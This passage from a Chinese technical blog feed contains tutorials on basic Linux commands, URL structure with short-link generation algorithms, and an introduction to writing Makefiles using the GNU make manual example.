class="code"><pre><span class="line">各列的含义：</span><br><span class="line"></span><br><span class="line">UID：该进程执行的用户id；</span><br><span class="line">PID：进程id；</span><br><span class="line">PPID：该进程的父级进程id，如果一个程序的父级进程找不到，该程序的进程称之为僵尸进程（parent process ID）；</span><br><span class="line">C：Cpu的占用率，其形式是百分数；</span><br><span class="line">STIME：进行的启动时间；</span><br><span class="line">TTY：终端设备，发起该进程的设备识别符号，如果显示“?”则表示该进程并不是由终端设备发起；</span><br><span class="line">TIME：进程的执行时间；</span><br><span class="line">CMD：该进程的名称或者对应的路径</span><br></pre></td></tr></table></figure><p><img src="/2019/08/22/Linux-Command/ps_2.png" alt></p><p><img src="/2019/08/22/Linux-Command/ps_3.png" alt></p><h5 id="ps-ef-grep-“进程名称”"><a href="#ps-ef-grep-“进程名称”" class="headerlink" title="#ps    -ef    |    grep    “进程名称”"></a>#ps    -ef    |    grep    “进程名称”</h5><p>用于查看特定进程的状态</p><h4 id="26-top指令"><a href="#26-top指令" class="headerlink" title="26.top指令"></a>26.<code>top</code>指令</h4><p>作用：查看服务器的进程占用的资源</p><h5 id="语法：进入命令：-top（动态显示）"><a href="#语法：进入命令：-top（动态显示）" class="headerlink" title="语法：进入命令：#top（动态显示）"></a>语法：进入命令：#top（动态显示）</h5><h5 id="退出命令：按下q键"><a href="#退出命令：按下q键" class="headerlink" title="退出命令：按下q键"></a>退出命令：按下q键</h5><p><img src="/2019/08/22/Linux-Command/top_1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">表头含义：</span><br><span class="line">PID：进程id；</span><br><span class="line">USER：该进程对应的用户；</span><br><span class="line">PR：优先级；</span><br><span class="line">VIRT：虚拟内存；</span><br><span class="line">RES：常驻内存；</span><br><span class="line">SHR：共享内存；</span><br><span class="line">计算一个进程实际使用的内存 = 常驻内存（RES）- 共享内存（SHR）</span><br><span class="line">S：表示进程的状态status（sleeping，其中S表示睡眠，R表示运行）；</span><br><span class="line">%CPU：表示CPU的占用百分比；</span><br><span class="line">%MEM：表示内存的占用百分比；</span><br><span class="line">TIME+：执行的时间；</span><br><span class="line">COMMAND：进程的名称或者路径</span><br></pre></td></tr></table></figure><p>在运行top命令时，可以有如下快捷键：</p><p>M：表示将结果按照内存（MEM）从高到低进行降序排列</p><p>P：表示将结果按照CPU使用率从高到低进行降序排列</p><p>1：当服务器拥有多个CPU的时候可以使用“1”快捷键来切换是否展示显示各个cpu的详细信息</p><h4 id="27-du-sh指令"><a href="#27-du-sh指令" class="headerlink" title="27.du -sh指令"></a>27.<code>du -sh</code>指令</h4><p>作用：查看目录的真实大小</p><h5 id="语法：-du-sh-目录路径"><a href="#语法：-du-sh-目录路径" class="headerlink" title="语法：#du    -sh    目录路径"></a>语法：#du    -sh    目录路径</h5><p>选项含义：</p><p>​        -s：summaries，只显示汇总的大小</p><p>​        -h：表示以高可读性的形式进行显示</p><p><img src="/2019/08/22/Linux-Command/du_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/du_2.png" alt></p><h4 id="28-find指令"><a href="#28-find指令" class="headerlink" title="28.find指令"></a>28.<code>find</code>指令</h4><p>作用：用于查找文件（参数贼多，55个）</p><h5 id="语法：-find-路径范围-选项-选项的值"><a href="#语法：-find-路径范围-选项-选项的值" class="headerlink" title="语法：#find    路径范围    选项    选项的值"></a>语法：#find    路径范围    选项    选项的值</h5><p>选项：</p><p>​    -name：按照文件名称进行搜索（支持模糊搜索）</p><p>​    -type：按照文件的类型进行搜索（文件类型：“-”表示文件，在使用find的使用需要用f来替换；“d”表示文件夹）</p><p><img src="/2019/08/22/Linux-Command/find_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/find_2.png" alt></p><p>注：*为通配符，匹配所有字符</p><p><img src="/2019/08/22/Linux-Command/find_3.png" alt></p><p><img src="/2019/08/22/Linux-Command/find_4.png" alt></p><h4 id="29-service指令"><a href="#29-service指令" class="headerlink" title="29.service指令"></a>29.<code>service</code>指令</h4><p>作用：用于控制一些软件的服务启动、停止、重启</p><h5 id="语法：-service-服务名-start-stop-restart"><a href="#语法：-service-服务名-start-stop-restart" class="headerlink" title="语法：#service    服务名    start/stop/restart"></a>语法：#service    服务名    start/stop/restart</h5><p>例：启动本机安装的Apache，其服务名为httpd</p><p><img src="/2019/08/22/Linux-Command/service_1.png" alt></p><ul><li>其服务启动规则可自己编写，后续将会专门开一篇讲述</li></ul><h4 id="30-kill指令"><a href="#30-kill指令" class="headerlink" title="30.kill指令"></a>30.<code>kill</code>指令</h4><p>作用：表示杀死进程（当遇到僵尸进程或者处于某些原因需要关闭进程的时候）</p><h5 id="语法：-kill-进程的PID（需要配合ps一起使用）"><a href="#语法：-kill-进程的PID（需要配合ps一起使用）" class="headerlink" title="语法：#kill    进程的PID（需要配合ps一起使用）"></a>语法：#kill    进程的PID（需要配合ps一起使用）</h5><p><img src="/2019/08/22/Linux-Command/kill_1.png" alt></p><p>与kill相似的命令：#killall</p><h5 id="语法：-killall-进程名称"><a href="#语法：-killall-进程名称" class="headerlink" title="语法：#killall    进程名称"></a>语法：#killall    进程名称</h5><p><img src="/2019/08/22/Linux-Command/kill_2.png" alt></p><h4 id="31-ifconfig指令"><a href="#31-ifconfig指令" class="headerlink" title="31.ifconfig指令"></a>31.<code>ifconfig</code>指令</h4><p>作用：用于操作网卡相关的指令</p><p>语法：#ifconfig（获取网卡信息）</p><p>注意该命令在windows环境下为ipconfig</p><p>Eth0表示Linux中的一个网卡，eth0是其名称。Lo（<strong>loop，本地回还网卡，其ip地址一般都是127.0.0.1</strong>）也是一个网卡名称。注意：inet addr就是网卡的ip地址。</p><p><img src="/2019/08/22/Linux-Command/ifconfig_1.png" alt></p><p><img src="/2019/08/22/Linux-Command/ifconfig_2.png" alt></p><h4 id="32-reboot指令"><a href="#32-reboot指令" class="headerlink" title="32.reboot指令"></a>32.<code>reboot</code>指令</h4><p>作用：重启计算机</p><h5 id="语法1：-reboot"><a href="#语法1：-reboot" class="headerlink" title="语法1：#reboot"></a>语法1：#reboot</h5><p>重启</p><h5 id="语法2：-reboot-w"><a href="#语法2：-reboot-w" class="headerlink" title="语法2：#reboot    -w"></a>语法2：#reboot    -w</h5><p>模拟重启，但是不重启（只写关机与开机的日志信息）</p><h4 id="33-shutdown指令"><a href="#33-shutdown指令" class="headerlink" title="33.shutdown指令"></a>33.<code>shutdown</code>指令</h4><p>作用：关机（慎用）</p><h5 id="语法1：-shutdown-h-now-“关机提示”"><a href="#语法1：-shutdown-h-now-“关机提示”" class="headerlink" title="语法1：#shutdown    -h    now    “关机提示”"></a>语法1：#shutdown    -h    now    “关机提示”</h5><h5 id="shutdown-h-time-14-41-“关机提示”"><a href="#shutdown-h-time-14-41-“关机提示”" class="headerlink" title="#shutdown    -h    time(14:41)    “关机提示”"></a>#shutdown    -h    time(14:41)    “关机提示”</h5><p><img src="/2019/08/22/Linux-Command/shutdown_1.png" alt></p><p>如果想要取消关机计划的话，则可以按照以下方式去尝试：</p><p><strong>①针对于centos7.x之前的版本：ctrl+c</strong></p><p><strong>②针对于centos7.x（包含）之后的版本：#shutdown  -c</strong></p><blockquote><p>除了shutdown关机以外，还有以下几个关机命令</p><p><code>#init    0</code></p><p><code>#halt</code></p><p><code>#poweroff</code></p></blockquote><h4 id="34-uptime指令"><a href="#34-uptime指令" class="headerlink" title="34.uptime指令"></a>34.<code>uptime</code>指令</h4><p>作用：输出计算机的持续在线时间（计算机从开机到现在运行的时间）</p><h5 id="语法：-uptime"><a href="#语法：-uptime" class="headerlink" title="语法：#uptime"></a>语法：#uptime</h5><p><img src="/2019/08/22/Linux-Command/uptime_1.png" alt></p><h4 id="35-uname指令"><a href="#35-uname指令" class="headerlink" title="35.uname指令"></a>35.<code>uname</code>指令</h4><p>作用：获取计算机操作系统的相关信息</p><h5 id="语法1：-uname"><a href="#语法1：-uname" class="headerlink" title="语法1：#uname"></a>语法1：#uname</h5><p>获取操作系统类型</p><h5 id="语法2：-uname-a"><a href="#语法2：-uname-a" class="headerlink" title="语法2：#uname    -a"></a>语法2：#uname    -a</h5><p>-a：表示all，表示获取全部的系统信息（<strong>类型、全部主机名、内核版本、发布时间、开源计划</strong>）</p><p><img src="/2019/08/22/Linux-Command/uname_1.png" alt></p><h4 id="36-netstat-tnlp指令"><a href="#36-netstat-tnlp指令" class="headerlink" title="36.netstat    -tnlp指令"></a>36.<code>netstat    -tnlp</code>指令</h4><p>作用：查看网络连接状态</p><h5 id="语法：-netstat-tnlp"><a href="#语法：-netstat-tnlp" class="headerlink" title="语法：#netstat    -tnlp"></a>语法：#netstat    -tnlp</h5><p><img src="/2019/08/22/Linux-Command/netstat_1.png" alt></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项说明：</span><br><span class="line">-t：表示只列出tcp协议的连接；</span><br><span class="line">-n：表示将地址从字母组合转化成ip地址，将协议转化成端口号来显示；</span><br><span class="line">-l：表示过滤出“state（状态）”列中其值为LISTEN（监听）的连接；</span><br><span class="line">-p：表示显示发起连接的进程pid和进程名称；</span><br></pre></td></tr></table></figure><h4 id="37-man指令"><a href="#37-man指令" class="headerlink" title="37.man指令"></a>37.<code>man</code>指令</h4><p>作用：manual，手册（包含了Linux中全部的命令手册，英文）</p><h5 id="语法：-man-命令"><a href="#语法：-man-命令" class="headerlink" title="语法：#man    命令"></a>语法：#man    命令</h5><p>退出按下q键</p><p>例：#man    cp</p><h2 id="编辑器之神——Vim编辑器"><a href="#编辑器之神——Vim编辑器" class="headerlink" title="编辑器之神——Vim编辑器"></a>编辑器之神——Vim编辑器</h2>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>url</title>
      <link href="/2019/08/19/url/"/>
      <url>/2019/08/19/url/</url>
      
        <content type="html"><![CDATA[<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><blockquote><p>引用：</p><p><a href="[https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6](https://zh.wikipedia.org/wiki/统一资源定位符">url_Wiki</a>)</p><p><a href="https://blog.csdn.net/zl1zl2zl3/article/details/84712511" target="_blank" rel="noopener">短链接原理分析</a></p><p><a href="https://blog.csdn.net/u011944141/article/details/88646552" target="_blank" rel="noopener">短链接的算法</a></p></blockquote><h2 id="统一资源定位符（英语：Uniform-Resource-Locator）"><a href="#统一资源定位符（英语：Uniform-Resource-Locator）" class="headerlink" title="统一资源定位符（英语：Uniform Resource Locator）"></a>统一资源定位符（英语：<strong>U</strong>niform <strong>R</strong>esource <strong>L</strong>ocator）</h2><p><strong>统一资源定位符</strong>（英语：<strong>U</strong>niform <strong>R</strong>esource <strong>L</strong>ocator，缩写：<strong>URL</strong>；或称<strong>统一资源定位器</strong>、<strong>定位地址</strong>、<strong>URL地址</strong>，俗称<strong>网页地址</strong>或简称<strong>网址</strong>）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被[万维网联盟4编制为因特网标准<a href="https://tools.ietf.org/html/rfc1738" target="_blank" rel="noopener">RFC 1738</a>。</p><p>在互联网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的，可扩展的，它使用<a href="https://zh.wikipedia.org/wiki/美国信息交换标准代码" target="_blank" rel="noopener">美国信息交换标准代码</a>的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。</p><p>统一资源定位符的标准格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]: //服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID</span><br><span class="line">[protocol]://server_address:port/path_and_filename?search#fragmentID</span><br></pre></td></tr></table></figure><p>统一资源定位符的完整格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]: //访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径文件名?查询#片段ID</span><br></pre></td></tr></table></figure><p>其中[访问凭证信息]、[端口号]、[查询]、[片段ID]都属于选填项。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>超文本传输协议（http）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中：</p><ol><li>传送协议。</li><li>层级URL标记符号(为[//],固定不变)</li><li>访问资源需要的凭证信息（可省略）</li><li>服务器。（通常为域名，有时为IP地址）</li><li>端口号。（以数字方式表示，若为默认值可省略）</li><li>路径。（以“/”字符区别路径中的每一个目录名称）</li><li>查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题）</li><li>片段。以“#”字符为起点</li></ol><p>以<em><a href="http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2" target="_blank" rel="noopener">http://zh.wikipedia.org:80/w/index.php?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2</a></em> 为例, 其中：</p><ol><li><strong>http</strong>，是协议；</li><li><strong>zh.wikipedia.org</strong>，是服务器；</li><li><strong>80</strong>，是服务器上的网络端口号；</li><li><strong>/w/index.php</strong>，是路径；</li><li><strong>?title=Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2</strong>，是询问。</li></ol><p>大多数网页浏览器不要求用户输入网页中“<strong>http://</strong>”的部分，因为绝大多数网页内容是超文本传输协议文件。同样，“<strong>80</strong>”是超文本传输协议文件的常用端口号，因此一般也不必写明。一般来说用户只要键入统一资源定位符的一部分（<strong>zh.wikipedia.org/wiki/Special:%E9%9A%8F%E6%9C%BA%E9%A1%B5%E9%9D%A2</strong>）就可以了。</p><p>由于超文本传输协议允许服务器将浏览器重定向到另一个网页地址，因此许多服务器允许用户省略网页地址中的部分，比如 <strong>www</strong>。从技术上来说这样省略后的网页地址实际上是一个不同的网页地址，浏览器本身无法决定这个新地址是否通，服务器必须完成重定向的任务</p><h2 id="短链接"><a href="#短链接" class="headerlink" title="短链接"></a>短链接</h2><p>短链接本质上是http协议中的重定向内容，一般为http301和http302</p><p>短链接的优势：简短、美观、便于传播</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>例如短链接 <a href="http://qnr.io/j6Dcss" target="_blank" rel="noopener">http://qnr.io/j6Dcss</a></p><p><img src="/2019/08/19/url/url_example.png" alt="url_example"></p><ol><li>DNS解析qnr.io域名，发送GET请求 /j6Dcss</li><li>服务器会通过短码获取对应的原URL</li><li>然后通过 HTTP 302 （或HTTP 301）转到对应的原URL</li></ol><h3 id="常见算法实现"><a href="#常见算法实现" class="headerlink" title="常见算法实现"></a>常见算法实现</h3><h4 id="自增序列算法"><a href="#自增序列算法" class="headerlink" title="自增序列算法"></a>自增序列算法</h4><p>短址的长度一般设为 6 位，而每一位是由 [a - z, A - Z, 0 - 9] 总共 62 个字母组成的，所以 6 位的话，总共会有 62^6 ~= 568亿种组合，一般肯定是够用了。<br>将原网址分配一个从1位到6位的随机短码，存数据库记录，对返回的id进行62进制转码。</p><p>即可使用发号策略。发号策略是这样的，当一个新的链接过来时，发号器发一个号与之对应。往后只要有新链接过来，发号器不停发号就好。举个例子，第一个进来的链接发号器发0号，对应的短链接为 xx.xxx/0，第二个进来的链接发号器发1号，对应的短链接为 xx.xxx/1，以此类推。<br>发号器发出的10进制号需要转换成62进制，这样可以大大缩短号码转换成字符串后的长度。比如发号器发出 10,000,000,000 这个号码，如果不转换成62进制，直接拼接在域名后面，得到这样一个链接 xx.xxx/10000000000。将上面的号码转换成62进制，结果为AOYKUa，长度只有6位，拼接得到的链接为 xx.xxx/AOYKUa。可以看得出，进制转换后得到的短链接长度变短了一些。6位62进制数，对应的号码空间为626，约等于568亿。也就是说发号器可以发568亿个号，这个号码空间应该能够满足多数项目的需求了，所以基本上不用担心发号器无号可发的情况。上述是发号策略压缩URL的原理，在实际写代码的过程中还需要考虑很多细节，比如缓存，存储等。</p><h4 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h4><p>将原网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节<br>对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理 这 30 位分成 6 段, 每 5位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串<br>总的 md5 串可以获得 4 个 6位串,取里面的任意一个就可作为这个长 url 的短 url 地址 这种算法,虽然会生成4个,但是仍然存在重复几率</p><h4 id="算法比较"><a href="#算法比较" class="headerlink" title="算法比较"></a>算法比较</h4><p>第一种算法的好处就是简单好理解，永不重复。但是短码的长度不固定，随着 id 变大从一位长度开始递增。如果非要让短码长度固定也可以就是让 id 从指定的数字开始递增就可以了。</p><p>第二种算法，虽然几率很小，但是存在碰撞（重复）的可能性。短码位数是比较固定的。</p><h3 id="Q：同一长链接，每次转成的短链接是否一样"><a href="#Q：同一长链接，每次转成的短链接是否一样" class="headerlink" title="Q：同一长链接，每次转成的短链接是否一样"></a>Q：同一长链接，每次转成的短链接是否一样</h3><p>A：同一长链接，每次转成的短链接不一定一样，原因在于如果查询缓存时，如果未命中，发号器会发新号给这个链接。需要说明的是，缓存应该缓存经常转换的热门链接，假设设定缓存过期时间为一小时，如果某个链接很活跃的话，缓存查询命中后，缓存会刷新这个链接的存活时间，重新计时，这个链接就会长久存在缓存中。对于一些生僻链接，从存入缓存开始，在存活时间内很可能不会被再次访问，存活时间结束缓存会删除记录。下一次转换这个生僻链接，缓存不命中，发号器会重新发号。这样一来会导致一条长链接对应多条短链接的情况出现，不仅浪费存储空间，又浪费发号器资源。那么是否有办法解决这个问题呢？是不是可以考虑建立一个长链接-短链接的key-value表，将所有的长链接和对应的短链接都存入其中，这样一来就实现了长短链接一一对应的了。但是想法是美好的，现实是不行的，原因在于，将所有的长链接-短链接对存入这样的表中，本身就需要耗费大量的存储空间，相对于生僻链接可能会对应多条短链接浪费的那点空间，这样做显然就得不偿失了。</p><h3 id="HTTP-301与-302的区别"><a href="#HTTP-301与-302的区别" class="headerlink" title="HTTP 301与 302的区别"></a>HTTP 301与 302的区别</h3><p>301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的。同时对服务器压力也会有一定减少。用户第一次访问某个短链接后，如果服务器返回301状态码，则这个用户在后续多次访问统一短链接，浏览器会直接请求跳转地址，而不是短链接地址，这样一来服务器端就无法收到用户的请求。如果服务器返回302状态码，且告知浏览器不缓存短链接请求，那么用户每次访问短链接，都会先去短链接服务端取回长链接地址，然后在跳转。从语义上来说，301跳转更为合适，因为是永久跳转，不会每次都访问服务端，还可以减小服务端压力。但如果使用301跳转，服务端就无法精确搜集用户的访问行为了。相反302跳转会导致服务端压力增大，但服务端此时就可精确搜集用户的访问行为。<br>但是如果使用了 301，我们就无法统计到短地址被点击的次数了。而点收集击次数的意义那就不言而喻了，关键是现在服务器硬件设备都很好，还有支持高并发的NGINX，所以对服务器的压力几乎可以忽略，最终也就选择302。</p>]]></content>
      
      
      
        <tags>
            
            <tag> url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile</title>
      <link href="/2019/06/06/Makefile/"/>
      <url>/2019/06/06/Makefile/</url>
      
        <content type="html"><![CDATA[<h1 id="Make"><a href="#Make" class="headerlink" title="Make"></a><center>Make</center></h1><blockquote><p>本文参考：</p><p><a href="&quot;/Makefile/《GNU+make中文手册-v3.80》.pdf&quot;">GNU+make中文手册</a></p><p><a href="/Makefile/make">GNU+make原版官方手册</a></p><p><a href="https://zh.wikipedia.org/wiki/Make" target="_blank" rel="noopener">make wiki</a></p><p><a href="https://zhuanlan.zhihu.com/p/47390641" target="_blank" rel="noopener">Makefile由浅入深</a></p><p><a href="https://seisman.github.io/how-to-write-makefile/index.html" target="_blank" rel="noopener">跟我一起写Makefile</a></p></blockquote><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>​        最初了解到Makefile，还是从很久很久以前说起。当时在老师底下做项目，要配置一个nginx服务器，当初给出教程是直接<code>make&amp;&amp;make install</code>就完事了，打完代码一行行执行下来看起来非常有成就感233333</p><p>​        但是之后在做计算机系统的实验时，才发现Makefile是如此的有用万能，无论是windows还是linux(ubuntu 16.04)下，只需要一个make就能解决编译链接安装问题，make完就能立即使用，实属好用。在之后的操作系统实验中，真正接触到了Makefile这东西，基本每个实验都要写Makefile，因此对Makefile的格式有了一个大概印象，但不过想深入了解一波，便去找了许多资料看。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在软件开发中，<strong>make</strong>是一个工具程序（Utility software），经由读取叫做“makefile”的文件，自动化建构软件。它是一种转化文件形式的工具，转换的目标称为“target”；与此同时，它也检查文件的依赖关系，如果需要的话，它会调用一些外部软件来完成任务。它的依赖关系检查系统非常简单，主要根据依赖文件的修改时间进行判断。大多数情况下，它被用来编译源代码，生成结果代码，然后把结果代码连接起来生成<strong>可执行文件</strong>或者<strong>库文件</strong>。它使用叫做“makefile”的文件来确定一个target文件的依赖关系，然后把生成这个target的相关命令传给shell去执行。</p><p>许多现代软件的开发中（如<a href="https://zh.wikipedia.org/wiki/Microsoft_Visual_Studio" target="_blank" rel="noopener">Microsoft Visual Studio</a>（他其实有提供一个vs 2017 交叉工具命令提示符，可以进行make，但不过一般在IDE中直接编译生成独有的工程配置文件）），集成开发环境已经取代make，但是在Unix环境中，仍然有许多任务程师采用make来协助软件开发。</p><h2 id="Makefile介绍"><a href="#Makefile介绍" class="headerlink" title="Makefile介绍"></a>Makefile介绍</h2><p>make命令执行时，需要一个makefile文件，以告诉make命令需要怎么样的去编译和链接程序。</p><p>首先，我们用一个示例来说明makefile的书写规则，以便给大家一个感性认识。这个示例来源于gnu 的make使用手册，在这个示例中，我们的工程有8个c文件，和3个头文件，我们要写一个makefile来告 诉make命令如何编译和链接这几个文件。我们的规则是：</p><ol><li>如果这个工程没有编译过，那么我们的所有c文件都要编译并被链接。</li><li>如果这个工程的某几个c文件被修改，那么我们只编译被修改的c文件，并链接目标程序。</li><li>如果这个工程的头文件被改变了，那么我们需要编译引用了这几个头文件的c文件，并链接目标程序。</li></ol><p>只要我们的makefile写得够好，所有的这一切，我们只用一个make命令就可以完成，make命令会自动智能 地根据当前的文件修改的情况来确定哪些文件需要重编译，从而自动编译所需要的文件和链接目标程序。 </p><h3 id="Makefile规则"><a href="#Makefile规则" class="headerlink" title="Makefile规则"></a>Makefile规则</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Makefile中，用#表示注释</span></span><br><span class="line">target ...:prerequisites...</span><br><span class="line">command 1</span><br><span class="line"><span class="comment">#注意命令前要用Tab</span></span><br><span class="line">command 2</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">#可以使用“\”表示续行，但是“\”之后不能有空格</span></span><br></pre></td></tr></table></figure><ul><li><p>target</p><p>可以是一个object file（目标文件），也可以是一个执行文件，还可以是一个标签（label）。对 于标签这种特性，在后续的“伪目标”章节中会有叙述。</p></li><li><p>prerequisites</p><p>生成该target所依赖的文件和/或target</p></li><li><p>command</p><p>该target要执行的命令（任意的shell命令）</p></li></ul><p>这是一个文件的依赖关系，也就是说，<strong>target这一个或多个的目标文件依赖于prerequisites中的文件</strong>， 其生成规则定义在command中。说白一点就是说:</p><p><strong>prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。</strong></p><p>这就是Makefile中最核心的规则。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>采用GNU make 手册中的例子</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    cc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    cc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    cc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    cc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    cc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    cc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    cc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    cc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    cc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>该工程有3个头文件和8个c文件</p><p>其中反斜杠(“\”)是换行符，注意换行符之后不能用空格。换行符又利用Makefile的阅读。</p><p>把Makefile放在处于工程下的，然后在该目录下输入<code>make</code>命令，就可以生成可执行文件了。如果要删除执行文件和所有的中间目标文件，那么只需要执行<code>make clean</code>就可以了。</p><p>在这个makefile中，目标文件（target）包含：执行文件edit和中间目标文件（ <code>*.o</code> ），依赖文 件（prerequisites）就是冒号后面的那些 <code>.c</code> 文件和 <code>.h</code> 文件。每一个 <code>.o</code> 文件都有 一组依赖文件，而这些 <code>.o</code> 文件又是执行文件 <code>edit</code> 的依赖文件。依赖关系的实质就是说明了目 标文件是由哪些文件生成的，换言之，目标文件是哪些文件更新的。</p><p>这里要说明一点的是， <code>clean</code> 不是一个文件，它只不过是一个动作名字，有点像c语言中的label一 样，其冒号后什么也没有，那么，make就不会自动去找它的依赖性，也就不会自动执行其后所定义的命令。 要执行其后的命令，就要在make命令后明显得指出这个label的名字。这样的方法非常有用，我们可以在一 个makefile中定义不用的编译或是和编译无关的命令，比如程序的打包，程序的备份，等等。</p><h3 id="make的执行过程如下："><a href="#make的执行过程如下：" class="headerlink" title="make的执行过程如下："></a>make的执行过程如下：</h3><ol><li>依次读取变量“MAKEFILES”定义的makefile文件列表</li><li>读取工作目录下的makefile文件（GNU make的顺序：缺省的是根据命名的查找顺序“GNUmakefile”，“makefile”，“Makefile”，首先找到那个就读取那个（假如是MAKEFILE，需要用<code>make -f</code>））</li><li>依次读取工作目录makefile文件中使用指示符“include”包含的文件</li><li>查找重建所有已读取的makefile文件的规则（如果存在一个目标是当前读取的某一个makefile文件，则执行此规则重建此makefile文件，完成以后从第一步开始重新执行）</li><li>初始化变量值并展开那些需要立即展开的变量和函数并根据预设条件确定执行分支</li><li>根据“终极目标”以及其他目标的依赖关系建立依赖关系链表</li><li>执行除“终极目标”以外的所有的目标的规则（规则中如果依赖文件中任一个文件的时间戳比目标文件新，则使用规则所定义的命令重建目标文件）</li><li>执行“终极目标”所在的规则</li></ol><p>一上面那个工程为示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在默认的方式下，也就是我们只输入 make 命令。那么，</span><br><span class="line"></span><br><span class="line">1.make会在当前目录下找名字叫“Makefile”或“makefile”的文件。</span><br><span class="line"></span><br><span class="line">2.如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“edit”这个 文件，并把这个文件作为最终的目标文件。</span><br><span class="line"></span><br><span class="line">3.如果edit文件不存在，或是edit所依赖的后面的 .o 文件的文件修改时间要比 edit 这个 文件新，那么，他就会执行后面所定义的命令来生成 edit 这个文件。</span><br><span class="line"></span><br><span class="line">4.如果 edit 所依赖的 .o 文件也不存在，那么make会在当前文件中找目标为 .o 文件 的依赖性，如果找到则再根据那一个规则生成 .o 文件。（这有点像一个堆栈的过程）</span><br><span class="line"></span><br><span class="line">5.当然，你的C文件和H文件是存在的啦，于是make会生成 .o 文件，然后再用 .o 文件生 成make的终极任务，也就是执行文件 edit 